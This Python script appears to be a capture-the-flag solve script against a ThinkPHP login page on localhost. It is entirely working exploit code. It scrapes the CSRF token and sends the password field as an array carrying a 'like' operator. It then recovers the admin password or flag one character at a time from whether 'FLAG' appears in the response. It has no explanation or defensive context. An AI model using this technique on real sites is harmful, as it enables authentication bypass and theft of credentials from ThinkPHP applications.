#!/usr/bin/python3
import re
import requests

url = 'http://127.0.0.1:30006'
flag = ''
charset = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
cookies = {
        'thinkphp_show_page_trace' : '0|0',
        'PHPSESSID' : 'b057bf602ee37248cf1cc9586ed7ebd2',
        'thinkphp_show_page_trace' : '0|0',
        }

def oneTry(c):
    global flag, k
    t = requests.get(url + '/index.html', cookies = cookies)
    token = re.findall(r'\w{32}', t.text)[0]
    data = {
            'username'      : 'admin',
            'password[0]'   : 'like',
            'password[1]'   : flag + c + '%',
            '__token__'     : token,
            }
    p = requests.post(url + '/login/index', data = data, cookies = cookies)
    if 'FLAG' in p.text:
        flag += c
        k = True

while True:
    k = False
    for c in charset:
        oneTry(c)
        print(c)
        print(flag)
        if k:
            break

